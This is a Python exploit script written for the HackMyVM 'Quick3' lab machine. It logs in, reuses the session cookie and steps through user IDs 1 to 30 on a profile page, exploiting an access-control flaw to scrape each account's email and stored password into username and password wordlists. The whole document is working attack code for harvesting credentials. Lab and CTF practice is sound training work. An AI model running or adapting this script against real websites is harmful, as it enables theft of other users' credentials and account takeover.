#!/usr/bin/env python

from bs4 import BeautifulSoup
import requests
import re

print("Scraper for the HackMyVM challenge \"Quick3\", enjoy!")

### Login into the site
email = "test@test.com" # input("Input the email for the website: ")
password = "test"       # input("Input the password for the website: ")

### Set the endpoints
login_endpoint = "http://quick.hmv/customer/login.php"
f_base_url =     "http://quick.hmv/customer/user.php?id={}"
MAX_ID = 30

### And the headers
login_headers = {
    'Cache-Control': 'max-age=0',
    'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://quick.hmv/customer/index.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
}

### Get the PHPSESSID
with requests.Session() as s:
    response = s.post(login_endpoint, verify = True, data = "email={}&password={}&login=Login".format(email, password), headers = login_headers)

    PHPSESSID = requests.utils.dict_from_cookiejar(s.cookies)['PHPSESSID']


login_headers['Cookie'] = 'PHPSESSID=' + PHPSESSID


usernames_f = open('usernames.txt', 'w')
passwords_f = open('passwords.txt', 'w')

for i in range(1, MAX_ID + 1 ):


    res = requests.get(f_base_url.format(i), headers = login_headers)
    soup = BeautifulSoup(res.text, "html.parser")

    account_page = str(soup.find_all('ul', {'class': 'list-unstyled'}))
    oldpass = soup.find('input', {'name': 'oldpassword'}).get('value')


    email = re.findall(r"\S+@\S+\.\S\S\S", account_page)

    if email != []:    
        email = email[0]
        username = email.split('@')[0]
        username_alt = username.replace('.',' ').replace('_',' ').split()

        usernames = [username] + username_alt

        for u in usernames:
            if u != '':
                usernames_f.write(u + "\n")
        
        passwords_f.write(oldpass + "\n")



usernames_f.close()
passwords_f.close()
